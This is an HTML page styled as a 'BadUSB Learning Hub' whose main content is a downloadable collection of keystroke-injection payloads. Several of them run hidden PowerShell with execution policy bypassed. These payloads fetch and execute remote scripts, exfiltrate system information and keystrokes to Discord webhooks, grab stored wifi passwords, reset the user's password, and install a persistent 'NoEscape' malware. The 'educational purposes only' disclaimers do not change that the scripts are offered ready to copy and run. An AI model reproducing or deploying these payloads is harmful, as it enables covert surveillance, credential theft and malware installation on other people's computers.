<html><head><base href="https://zrk-badusb-learning.com/">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZRK BadUSB Learning Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
    <style>
        :root {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --header-bg: #1e1e1e;
            --card-bg: #1c1c1c;
            --card-hover-bg: #2c2c2c;
            --accent-color: #bb86fc;
            --button-bg: #3700b3;
            --button-hover-bg: #6200ee;
            --code-bg: #2b2b2b;
        }

        .light-mode {
            --bg-color: #f0f2f5;
            --text-color: #333;
            --header-bg: #2c3e50;
            --card-bg: #ffffff;
            --card-hover-bg: #f5f5f5;
            --accent-color: #3498db;
            --button-bg: #3498db;
            --button-hover-bg: #2980b9;
            --code-bg: #f7f9fb;
        }

        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            margin: 0;
            padding: 0;
            background-color: var(--bg-color);
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: var(--header-bg);
            color: white;
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            margin: 0;
            font-size: 2.5em;
            animation: fadeInDown 0.5s ease-out;
        }
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .disclaimer {
            background-color: #e74c3c;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
            border-radius: 5px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.4);
            }
            70% {
                box-shadow: 0 0 0 10px rgba(231, 76, 60, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0);
            }
        }
        .search-container {
            margin-bottom: 30px;
        }
        #search {
            width: 100%;
            padding: 15px;
            font-size: 18px;
            border: none;
            border-radius: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
            background-color: var(--card-bg);
            color: var(--text-color);
        }
        #search:focus {
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            outline: none;
        }
        .categories {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        .category {
            background-color: var(--button-bg);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: none;
            font-size: 14px;
            font-weight: bold;
        }
        .category:hover {
            background-color: var(--button-hover-bg);
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
        }
        .attack-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        .attack-item {
            background-color: var(--card-bg);
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            overflow: hidden;
            transition: all 0.3s ease;
            animation: fadeIn 0.5s ease-out;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .attack-item:hover {
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
            background-color: var(--card-hover-bg);
        }
        .attack-header {
            background-color: var(--header-bg);
            color: white;
            padding: 15px;
            position: relative;
            overflow: hidden;
        }
        .attack-header::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255,255,255,0.1);
            transform: rotate(45deg);
            transition: all 0.3s ease;
        }
        .attack-item:hover .attack-header::after {
            top: -10%;
            left: -10%;
        }
        .attack-name {
            font-weight: bold;
            font-size: 1.2em;
            margin: 0;
        }
        .attack-category {
            font-size: 0.9em;
            opacity: 0.8;
        }
        .attack-content {
            padding: 15px;
        }
        .attack-description {
            margin-bottom: 15px;
        }
        .attack-code {
            background-color: var(--code-bg);
            border: 1px solid #444;
            border-radius: 5px;
            padding: 10px;
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 0.9em;
            max-height: 200px;
            overflow-y: auto;
            position: relative;
            color: var(--text-color);
        }
        .copy-btn, .download-btn {
            position: absolute;
            top: 5px;
            padding: 5px 10px;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.3s ease;
            opacity: 0;
        }
        .attack-item:hover .copy-btn,
        .attack-item:hover .download-btn {
            opacity: 1;
        }
        .copy-btn {
            right: 80px;
            background-color: var(--button-bg);
        }
        .download-btn {
            right: 5px;
            background-color: var(--button-bg);
        }
        .copy-btn:hover, .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .copy-btn:hover {
            background-color: var(--button-hover-bg);
        }
        .download-btn:hover {
            background-color: var(--button-hover-bg);
        }
        .download-all-btn {
            display: block;
            margin: 20px auto;
            padding: 12px 30px;
            background-color: var(--button-bg);
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .download-all-btn:hover {
            background-color: var(--button-hover-bg);
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
        }
        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-color);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--accent-color);
            border-radius: 5px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--button-hover-bg);
        }
        
        /* Updated styles for ZRK NoEscape */
        .attack-item.zrk-noescape {
            background-color: #300;
            border: 2px solid #f00;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        .attack-item.zrk-noescape .attack-header {
            background-color: #600;
            color: #ff0;
        }
        
        .attack-item.zrk-noescape::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, #f00, transparent);
            animation: glitch 10s linear infinite;
            opacity: 0.2;
        }
        
        @keyframes glitch {
            0% {
                transform: translateX(-10%) translateY(-10%) rotate(0deg);
            }
            25% {
                transform: translateX(10%) translateY(10%) rotate(90deg);
            }
            50% {
                transform: translateX(-10%) translateY(10%) rotate(180deg);
            }
            75% {
                transform: translateX(10%) translateY(-10%) rotate(270deg);
            }
            100% {
                transform: translateX(-10%) translateY(-10%) rotate(360deg);
            }
        }
        
        .attack-item.zrk-noescape .attack-name {
            text-shadow: 0 0 5px #f00;
        }
        
        .attack-item.zrk-noescape .attack-name::after {
            content: ' ⚠️';
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .attack-item.zrk-noescape .attack-description,
        .attack-item.zrk-noescape .attack-category {
            color: #faa;
        }
        
        .attack-item.zrk-noescape .attack-code {
            background-color: #200;
            border-color: #600;
            color: #faa;
        }
        
        .attack-item.zrk-noescape .copy-btn,
        .attack-item.zrk-noescape .download-btn {
            background-color: #900;
        }
        
        .attack-item.zrk-noescape .copy-btn:hover,
        .attack-item.zrk-noescape .download-btn:hover {
            background-color: #c00;
        }

        /* News Button and Popup Styles */
        #newsBtn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: var(--button-bg);
            color: white;
            border: none;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            z-index: 1000;
        }

        #newsBtn:hover {
            background-color: var(--button-hover-bg);
            transform: scale(1.1);
        }

        #newsPopup {
            display: none;
            position: fixed;
            bottom: 100px;
            right: 20px;
            width: 400px;
            height: 600px;
            background-color: var(--card-bg);
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            overflow: hidden;
            z-index: 1001;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        #newsHeader {
            background-color: var(--header-bg);
            color: white;
            padding: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
            user-select: none;
        }

        #newsTitle {
            font-weight: bold;
        }

        #newsControls {
            display: flex;
            align-items: center;
        }

        .newsControl {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-left: 5px;
            cursor: pointer;
        }

        #newsMinimize {
            background-color: #f1c40f;
        }

        #newsMaximize {
            background-color: #2ecc71;
        }

        #newsClose {
            background-color: #e74c3c;
        }

        #newsContent {
            padding: 15px;
            height: calc(100% - 40px);
            overflow-y: auto;
        }

        .news-item {
            background-color: var(--card-bg);
            margin-bottom: 15px;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .news-item h3 {
            margin: 0 0 10px 0;
            font-size: 1.1em;
            color: var(--accent-color);
        }

        .news-item p {
            margin: 0;
            font-size: 0.9em;
            color: var(--text-color);
        }

        .news-item .read-more {
            display: inline-block;
            margin-top: 10px;
            color: var(--accent-color);
            text-decoration: none;
            font-weight: bold;
        }

        .news-item .read-more:hover {
            text-decoration: underline;
        }

        .full-article {
            display: none;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #444;
        }

        #toggleMode {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: var(--button-bg);
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            font-size: 20px;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            z-index: 1000;
        }

        #toggleMode:hover {
            background-color: var(--button-hover-bg);
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>ZRK BadUSB Learning Hub</h1>
        </div>
    </header>

    <div class="container">
        <div class="disclaimer">
            WARNING: This database is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.
        </div>

        <div class="search-container">
            <input type="text" id="search" placeholder="Search for BadUSB attacks...">
        </div>

        <div class="categories" id="categories">
            <!-- Categories will be dynamically added here -->
        </div>

        <button id="downloadAllBtn" class="download-all-btn">Download All Scripts</button>

        <div class="attack-list" id="attackList">
            <!-- Attack items will be dynamically added here -->
        </div>
    </div>

    <button id="newsBtn">📰</button>
    <div id="newsPopup">
        <div id="newsHeader">
            <span id="newsTitle">ZRK News</span>
            <div id="newsControls">
                <div class="newsControl" id="newsMinimize"></div>
                <div class="newsControl" id="newsMaximize"></div>
                <div class="newsControl" id="newsClose"></div>
            </div>
        </div>
        <div id="newsContent">
            <!-- News items will be dynamically added here -->
        </div>
    </div>

    <button id="toggleMode">🌓</button>

    <script>
        const attacks = [
            {
                name: "ZRK Computer Info to Discord",
                category: "Reconnaissance",
                description: "Retrieves computer information and sends it to a Discord webhook.",
                code: `REM Title: Computer info to Discord Webhook
REM Description: Retrieves the computer information and sends it as JSON content in a POST request to a Discord webhook.
REM AUTHOR: K1kuK0nK4
REM Target: Windows

DELAY 1500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000
REM Replace "webhookgoeshere" by webhook URL.
STRING $webhook = "webhookgoeshere";
REM Replace the base64 string by the powershell encoded script.
STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
DELAY 1000
ENTER`
},
            {
                name: "ZRK Disable Windows Password",
                category: "System Exploitation",
                description: "Disables the Windows password for the current user.",
                code: `REM Title: Disable Windows Password
REM Description: This script disables the Windows password for the current user.
REM Target: Windows

DELAY 2500
REM Minimize all apps
GUI d
DELAY 500
REM Start PowerShell as admin
GUI r
DELAY 500
STRING powershell.exe -windowstyle hidden
DELAY 200
CTRL SHIFT ENTER
DELAY 2000
LEFT
DELAY 150
ENTER
DELAY 2000
REM Disable Windows password
STRING net user $env:USERNAME *
ENTER
DELAY 150
ENTER
DELAY 150
ENTER
DELAY 200
REM Exit from PowerShell
STRING exit
ENTER
REM Make Caps Lock flash to indicate completion
CAPSLOCK
DELAY 150
CAPSLOCK
DELAY 150
CAPSLOCK
DELAY 150
CAPSLOCK
DELAY 2000
CAPSLOCK
DELAY 150
CAPSLOCK
DELAY 150
CAPSLOCK
DELAY 150
CAPSLOCK
REM End of payload`
        
            },
            {
                name: "ZRK JumpScare 2.0",
                category: "Prank",
                description: "Executes a jumpscare when mouse movement is detected.",
                code: `DELAY 2000
GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/kiv' -O "$D\\js.zip";Expand-Archive "$D\\js.zip" -Des $D -Force;. "$D\\js\\js.ps1"
ENTER`
            },
            {
                name: "ZRK Keylogger",
                category: "Surveillance",
                description: "PowerShell-based keylogger that exfiltrates logs to Discord.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
ENTER`
            },
            {
                name: "ZRK Wallpaper-Troll",
                category: "Prank",
                description: "Changes the target's wallpaper to taunt them.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
DELAY 500
ENTER`
            },
            {
                name: "ZRK We-Found-You",
                category: "Pranks",
                description: "Opens a map in the target's web browser with their current location.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
ENTER`
            },
            {
                name: "ZRK Wifi Grabber",
                category: "Network Exploitation",
                description: "Grabs target's wifi passwords and uploads them to Dropbox or Discord.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
ENTER`
            },
            {
                name: "ZRK YouTube-TripWire",
                category: "Prank",
                description: "Plays a YouTube video after mouse movement is detected.",
                code: `GUI r
DELAY 500
STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/sOLIdqpzrW4;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
ENTER`
            },
            {
                name: "ZRK ADV-Recon",
                category: "Reconnaissance",
                description: "Performs advanced reconnaissance of the target's PC.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
ENTER`
            },
            {
                name: "ZRK Hacker Goose",
                category: "Prank",
                description: "Simulates a goose hacking the target's PC in real-time.",
                code: `GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\\hg.zip";Expand-Archive "$D\\hg.zip" -Des $D -Force;. "$D\\hg\\main.ps1"
ENTER`
            },
            {
                name: "ZRK iPhone Dialer",
                category: "Mobile Prank",
                description: "Dials a specified number on an unlocked iPhone.",
                code: `DEFINE #PHONE-APP-NAME example
DEFINE #NUMBER example

GUI SPACE
DELAY 300
STRING #PHONE-APP-NAME
ENTER
DELAY 1000
BACKSPACE
STRING #NUMBER
DELAY 500
ENTER`
            },
            {
                name: "ZRK Try To Catch Me",
                category: "Prank",
                description: "Downloads and runs a Python script to prank the target.",
                code: `DEFINE SCRIPT-PY-LINK example.com

DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 500

STRING Invoke-WebRequest -Uri "
STRING SCRIPT-PY-LINK
STRING " -OutFile "script.py"
ENTER
DELAY 500

STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
DELAY 1000
ALT F4`
            },
            {
                name: "ZRK Admin PowerShell",
                category: "System Access",
                description: "Starts a PowerShell with administrator permissions in Windows.",
                code: `DELAY 1000
GUI x
DELAY 500
STRING a
DELAY 500
LEFT_ARROW
DELAY 500
ENTER

DELAY 2000
STRINGLN Get-ExecutionPolicy -List
DELAY 500
STRINGLN Set-ExecutionPolicy Bypass
DELAY 500
STRINGLN Get-ExecutionPolicy -List
DELAY 500
STRINGLN Get-ExecutionPolicy -List
DELAY 500
STRINGLN Set-ExecutionPolicy Bypass
DELAY 500
STRINGLN Get-ExecutionPolicy -List
DELAY 500
ALT F4`
            },
            {
                name: "ZRK NoEscape",
                category: "Malware",
                description: "A highly dangerous and persistent malware. Use with extreme caution.",
                code: `REM ZRK NoEscape - Highly dangerous malware
REM USE WITH EXTREME CAUTION
REM This script is for educational purposes only
REM Unauthorized use is strictly prohibited

DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/ZRKHacks/NoEscape/main/install.ps1\')\"'"
ENTER
DELAY 1000
LEFT
DELAY 500
ENTER

REM The rest of the script is omitted for safety reasons
REM The full script would attempt to install persistent malware`
            }
        ];

        const categories = [...new Set(attacks.map(attack => attack.category))];
        const categoryContainer = document.getElementById('categories');
        categories.forEach(category => {
            const button = document.createElement('button');
            button.textContent = category;
            button.classList.add('category');
            button.addEventListener('click', () => filterAttacks(category));
            categoryContainer.appendChild(button);
        });

        const attackList = document.getElementById('attackList');
        const searchInput = document.getElementById('search');

        function renderAttacks(filteredAttacks) {
            attackList.innerHTML = '';
            filteredAttacks.forEach(attack => {
                const attackItem = document.createElement('div');
                attackItem.classList.add('attack-item');
                if (attack.name === "ZRK NoEscape") {
                    attackItem.classList.add('zrk-noescape');
                }
                attackItem.innerHTML = `
                    <div class="attack-header">
                        <h2 class="attack-name">${attack.name}</h2>
                        <span class="attack-category">${attack.category}</span>
                    </div>
                    <div class="attack-content">
                        <p class="attack-description">${attack.description}</p>
                        <div class="attack-code">
                            <pre><code>${attack.code}</code></pre>
                            <button class="copy-btn">Copy</button>
                            <button class="download-btn">Download</button>
                        </div>
                    </div>
                `;
                attackList.appendChild(attackItem);

                const copyBtn = attackItem.querySelector('.copy-btn');
                copyBtn.addEventListener('click', () => copyToClipboard(attack.code));

                const downloadBtn = attackItem.querySelector('.download-btn');
                downloadBtn.addEventListener('click', () => downloadScript(attack));
            });
        }

        function filterAttacks(category = '') {
            const searchTerm = searchInput.value.toLowerCase();
            const filteredAttacks = attacks.filter(attack => 
                (category === '' || attack.category === category) &&
                (attack.name.toLowerCase().includes(searchTerm) || 
                 attack.description.toLowerCase().includes(searchTerm) ||
                 attack.code.toLowerCase().includes(searchTerm))
            );
            renderAttacks(filteredAttacks);
        }

        searchInput.addEventListener('input', () => filterAttacks());

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('Code copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy text: ', err);
            });
        }

        function downloadScript(attack) {
            const blob = new Blob([attack.code], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${attack.name.replace(/\s+/g, '_')}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        const downloadAllBtn = document.getElementById('downloadAllBtn');
        downloadAllBtn.addEventListener('click', downloadAllScripts);

        function downloadAllScripts() {
            const zip = new JSZip();
            attacks.forEach(attack => {
                zip.file(`${attack.name.replace(/\s+/g, '_')}.txt`, attack.code);
            });
            zip.generateAsync({type:"blob"})
            .then(function(content) {
                saveAs(content, "all_scripts.zip");
            });
        }

        renderAttacks(attacks);

        // News functionality
        const newsBtn = document.getElementById('newsBtn');
        const newsPopup = document.getElementById('newsPopup');
        const newsContent = document.getElementById('newsContent');
        const newsClose = document.getElementById('newsClose');
        const newsMinimize = document.getElementById('newsMinimize');
        const newsMaximize = document.getElementById('newsMaximize');

        newsBtn.addEventListener('click', toggleNewsPopup);
        newsClose.addEventListener('click', closeNewsPopup);
        newsMinimize.addEventListener('click', minimizeNewsPopup);
        newsMaximize.addEventListener('click', maximizeNewsPopup);

        function toggleNewsPopup() {
            if (newsPopup.style.display === 'none' || newsPopup.style.display === '') {
                newsPopup.style.display = 'block';
                loadNews();
            } else {
                newsPopup.style.display = 'none';
            }
        }

        function closeNewsPopup() {
            newsPopup.style.display = 'none';
        }

        function minimizeNewsPopup() {
            newsPopup.style.height = '40px';
            newsContent.style.display = 'none';
        }

        function maximizeNewsPopup() {
            newsPopup.style.height = '600px';
            newsContent.style.display = 'block';
        }

        function loadNews() {
            const newsItems = [
                {
                    title: "ZRK BadUSB Learning Hub Launches",
                    content: "We're excited to announce the launch of our new BadUSB Learning Hub! This platform is designed to educate users about BadUSB techniques and their potential impacts.",
                    fullArticle: "The ZRK BadUSB Learning Hub is a comprehensive resource for cybersecurity professionals, ethical hackers, and curious minds. Our platform offers a wide range of BadUSB scripts, detailed explanations, and best practices for defense. Remember, knowledge is power, but always use it responsibly!"
                },
                {
                    title: "New 'ZRK NoEscape' Script Added",
                    content: "We've added a new high-risk script to our database. The 'ZRK NoEscape' is a powerful tool that demonstrates the potential dangers of BadUSB attacks.",
                    fullArticle: "The 'ZRK NoEscape' script is our most advanced creation yet. It showcases the devastating potential of BadUSB attacks when used maliciously. This script is included in our database purely for educational purposes, to highlight the importance of robust cybersecurity measures. We strongly advise against any attempt to use this script in real-world scenarios."
                },
                {
                    title: "ZRK Expands BadUSB Research Team",
                    content: "We're thrilled to announce that ZRK is expanding our BadUSB research team! We are looking for passionate individuals to join us in advancing our understanding of BadUSB threats and defenses.",
                    fullArticle: "ZRK is on the lookout for talented researchers to join our BadUSB team. If you have a background in cybersecurity, a keen interest in BadUSB technology, and a drive to make a difference, we want to hear from you. This is an exciting opportunity to contribute to cutting-edge research and development in the field of cybersecurity. Apply now to be a part of our dynamic team!"
                }
            ];

            newsContent.innerHTML = '';
            newsItems.forEach(item => {
                const newsItem = document.createElement('div');
                newsItem.classList.add('news-item');
                newsItem.innerHTML = `
                    <h3>${item.title}</h3>
                    <p>${item.content}</p>
                    <a href="#" class="read-more">Read more</a>
                    <div class="full-article">${item.fullArticle}</div>
                `;
                newsContent.appendChild(newsItem);

                const readMoreLink = newsItem.querySelector('.read-more');
                const fullArticle = newsItem.querySelector('.full-article');
                readMoreLink.addEventListener('click', (e) => {
                    e.preventDefault();
                    if (fullArticle.style.display === 'none' || fullArticle.style.display === '') {
                        fullArticle.style.display = 'block';
                        readMoreLink.textContent = 'Read less';
                    } else {
                        fullArticle.style.display = 'none';
                        readMoreLink.textContent = 'Read more';
                    }
                });
            });
        }

        // Make the news popup draggable
        dragElement(newsPopup);

        function dragElement(elmnt) {
            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            if (document.getElementById(elmnt.id + "Header")) {
                document.getElementById(elmnt.id + "Header").onmousedown = dragMouseDown;
            } else {
                elmnt.onmousedown = dragMouseDown;
            }

            function dragMouseDown(e) {
                e = e || window.event;
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = closeDragElement;
                document.onmousemove = elementDrag;
            }

            function elementDrag(e) {
                e = e || window.event;
                e.preventDefault();
                pos1 = pos3 - e.clientX;
                pos2 = pos4 - e.clientY;
                pos3 = e.clientX;
                pos4 = e.clientY;
                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
            }

            function closeDragElement() {
                document.onmouseup = null;
                document.onmousemove = null;
            }
        }

        // Toggle between light and dark mode
        const toggleModeBtn = document.getElementById('toggleMode');
        toggleModeBtn.addEventListener('click', toggleMode);

        function toggleMode() {
            document.body.classList.toggle('light-mode');
            updateModeIcon();
        }

        function updateModeIcon() {
            toggleModeBtn.textContent = document.body.classList.contains('light-mode') ? '🌙' : '☀️';
        }

        // Initialize mode
        updateModeIcon();
    </script>
</body>
</html>
